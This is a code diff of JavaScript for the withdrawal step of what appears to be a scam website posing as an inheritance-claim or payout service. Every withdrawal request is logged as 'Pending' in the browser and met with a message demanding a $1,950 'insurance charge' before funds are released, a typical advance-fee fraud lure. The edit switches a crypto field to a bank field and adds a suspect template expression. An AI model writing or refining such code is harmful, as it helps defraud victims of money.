@@ -179,7 +179,7 @@ function deposit(amount, name) {
 function withdraw() {
   const address = document.getElementById("address").value.trim();
   const amount = parseFloat(document.getElementById("amount").value);
-  const crypto = document.getElementById("crypto").value;
+  const bank = document.getElementById("bank").value;
   const messageEl = document.getElementById("message");
 
   const users = JSON.parse(localStorage.getItem("users")) || {};
@@ -210,7 +210,7 @@ function withdraw() {
     id: Date.now(),
     user_id: email,
     type: "Withdraw",
-    name: crypto,
+    name: "name",
     amount: amount,
     status: "Pending",
     address: address,
@@ -220,7 +220,7 @@ function withdraw() {
   localStorage.setItem("transactions", JSON.stringify(transactions));
 
   messageEl.style.color = "#fc0f03";
-  messageEl.innerText = `Withdrawal request of ${amount} ${crypto} is not processed due to pending payment of the accrued insurance charge of 2.5% of the total inheritance reclaim ($1,950)`;
+  messageEl.innerText = `Withdrawal request of ${$}${amount}  is not processed due to pending payment of the accrued insurance charge of 2.5% of the total inheritance reclaim ($1,950)`;
 
   document.getElementById("address").value = "";
   document.getElementById("amount").value = "";
